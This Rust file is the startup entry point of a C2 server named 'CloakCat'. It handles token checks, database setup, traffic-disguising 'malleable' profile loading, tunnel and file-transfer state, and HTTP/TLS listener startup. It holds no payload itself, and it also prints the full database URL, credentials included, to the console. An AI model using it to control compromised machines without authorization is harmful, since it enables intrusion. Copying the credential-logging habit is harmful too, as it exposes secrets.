//! CloakCat C2 server entry point.

mod config;
mod db;
mod error;
mod handlers;
mod listener_mgr;
mod middleware;
mod routes;
mod service;
mod state;
mod tls;
mod tunnel;
mod validation;

use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::Arc;

use sqlx::postgres::PgPoolOptions;

use cloakcat_protocol::{ListenerProfile as _, MalleableProfile};

use crate::config::ServerConfig;
use crate::routes::build_router;
use crate::state::AppState;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    dotenvy::dotenv().ok();
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info")),
        )
        .init();

    // ── Auth tokens ──────────────────────────────────────────────────────────

    let shared_token_str = std::env::var("SHARED_TOKEN").expect("SHARED_TOKEN must be set");
    if shared_token_str.len() < 16 {
        panic!("SHARED_TOKEN must be at least 16 characters");
    }
    let operator_token_str = std::env::var("OPERATOR_TOKEN").expect("OPERATOR_TOKEN must be set");
    if operator_token_str.len() < 16 {
        panic!("OPERATOR_TOKEN must be at least 16 characters");
    }

    let derived_keys = cloakcat_protocol::DerivedKeys::from_master(shared_token_str.as_bytes());

    // ── Database ─────────────────────────────────────────────────────────────

    let db_url = std::env::var("DATABASE_URL").expect("DATABASE_URL must be set");
    println!("[startup] DATABASE_URL = {db_url}");
    let pool = PgPoolOptions::new()
        .max_connections(10)
        .connect(&db_url)
        .await?;
    let db_name: (String,) = sqlx::query_as("select current_database()")
        .fetch_one(&pool)
        .await?;
    println!("[startup] connected to database = {}", db_name.0);

    sqlx::migrate!("./migrations").run(&pool).await?;

    // ── Profile loading ──────────────────────────────────────────────────────

    let mut profiles_map: HashMap<String, Arc<MalleableProfile>> = HashMap::new();

    // 1. Load all .toml files from config/profiles/ (or PROFILES_DIR env var).
    let profiles_dir = std::env::var("PROFILES_DIR")
        .unwrap_or_else(|_| "config/profiles".to_string());
    if let Ok(entries) = std::fs::read_dir(&profiles_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) == Some("toml") {
                let path_str = path.to_string_lossy().to_string();
                match MalleableProfile::from_file(&path_str) {
                    Ok(p) => {
                        println!("[startup] profile loaded: name={} ({})", p.name(), path_str);
                        let p = Arc::new(p);
                        profiles_map.entry(p.name().to_string()).or_insert(p);
                    }
                    Err(e) => {
                        eprintln!("[startup] WARNING: failed to load {path_str}: {e}");
                    }
                }
            }
        }
    }

    // 2. Optionally override / add a single profile from MALLEABLE_PROFILE_PATH (backward compat).
    let malleable_profile =
        std::env::var("MALLEABLE_PROFILE_PATH").ok().and_then(|path| {
            match MalleableProfile::from_file(&path) {
                Ok(p) => {
                    println!("[startup] malleable profile override: name={}", p.name());
                    let p = Arc::new(p);
                    profiles_map.insert(p.name().to_string(), p.clone());
                    Some(p)
                }
                Err(e) => {
                    eprintln!("[startup] WARNING: failed to load malleable profile {path:?}: {e}");
                    None
                }
            }
        });

    let profiles = Arc::new(profiles_map);
    println!("[startup] {} profile(s) ready", profiles.len());

    // ── AppState ─────────────────────────────────────────────────────────────

    let state = AppState {
        db: pool,
        derived_keys,
        operator_token: operator_token_str,
        cmd_notify: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
        upload_buffers: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
        download_buffers: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
        tunnel_mgr: Arc::new(tokio::sync::Mutex::new(tunnel::TunnelManager::new())),
        malleable_profile,
        profiles,
        listener_mgr: Arc::new(tokio::sync::Mutex::new(listener_mgr::ListenerManager::new())),
    };

    // ── Tunnel GC background task ─────────────────────────────────────────────
    {
        let gc_mgr = state.tunnel_mgr.clone();
        tokio::spawn(async move {
            let mut interval = tokio::time::interval(tokio::time::Duration::from_secs(60));
            loop {
                interval.tick().await;
                gc_mgr.lock().await.gc();
            }
        });
    }

    // ── Router ───────────────────────────────────────────────────────────────

    // Build once; clone per additional listener (Router is Arc-backed, O(1) clone).
    let app = build_router(state.clone())
        .layer(axum::extract::DefaultBodyLimit::max(2 * 1024 * 1024)); // 2 MB

    // ── Listener startup ─────────────────────────────────────────────────────

    let server_config = ServerConfig::load();

    if !server_config.listeners.is_empty() {
        // server.toml mode: spawn each listener as an independent background task.
        for entry in &server_config.listeners {
            let listener_app = app.clone();
            let cancel = match entry.listener_type.as_str() {
                "https" => {
                    let cert_cfg = state
                        .profiles
                        .get(&entry.profile)
                        .and_then(|p| p.https_certificate.as_ref());
                    let cert_path = format!("config/certs/{}.pem", entry.profile);
                    let key_path = format!("config/certs/{}_key.pem", entry.profile);
                    let tls_config = tls::ensure_rustls_config(
                        &cert_path,
                        &key_path,
                        cert_cfg,
                        &entry.profile,
                    )
                    .await?;
                    listener_mgr::spawn_https(entry, listener_app, tls_config).await?
                }
                "http" | _ => listener_mgr::spawn_http(entry, listener_app).await?,
            };
            state.listener_mgr.lock().await.insert(entry.clone(), cancel);
        }

        println!("[startup] all listeners started — press Ctrl+C to stop");
        tokio::signal::ctrl_c().await.ok();
        println!("[shutdown] stopping…");
    } else {
        // Backward-compat single-listener mode (env-var or auto-TLS).
        let cert_path_env = std::env::var("TLS_CERT_PATH").ok();
        let key_path_env = std::env::var("TLS_KEY_PATH").ok();

        // If no explicit cert paths, try to auto-generate from the primary malleable profile.
        let (resolved_cert, resolved_key) = if cert_path_env.is_some() && key_path_env.is_some() {
            (cert_path_env, key_path_env)
        } else if let Some(ref mp) = state.malleable_profile {
            if mp.https_certificate.is_some() {
                let cp = format!("config/certs/{}.pem", mp.name());
                let kp = format!("config/certs/{}_key.pem", mp.name());
                (Some(cp), Some(kp))
            } else {
                (None, None)
            }
        } else {
            (None, None)
        };

        if let (Some(cert), Some(key)) = (resolved_cert, resolved_key) {
            let cert_cfg = state.malleable_profile.as_deref().and_then(|p| p.https_certificate.as_ref());
            let profile_name = state.malleable_profile.as_deref().map(|p| p.name()).unwrap_or("server");
            let tls_config = tls::ensure_rustls_config(&cert, &key, cert_cfg, profile_name).await?;
            let addr: SocketAddr = std::env::var("LISTEN_ADDR")
                .unwrap_or_else(|_| "0.0.0.0:3443".to_string())
                .parse()?;
            println!("[startup] C2 server running at https://{addr} (TLS)");
            axum_server::bind_rustls(addr, tls_config)
                .serve(app.into_make_service())
                .await?;
        } else {
            let addr: SocketAddr = "127.0.0.1:3000".parse().unwrap();
            eprintln!(
                "[startup] WARNING: Running in HTTP mode. \
                 Set TLS_CERT_PATH and TLS_KEY_PATH, or configure [https_certificate] in profile."
            );
            println!("[startup] C2 server running at http://{addr} (HTTP)");
            let listener = tokio::net::TcpListener::bind(addr).await?;
            axum::serve(listener, app).await?;
        }
    }

    Ok(())
}
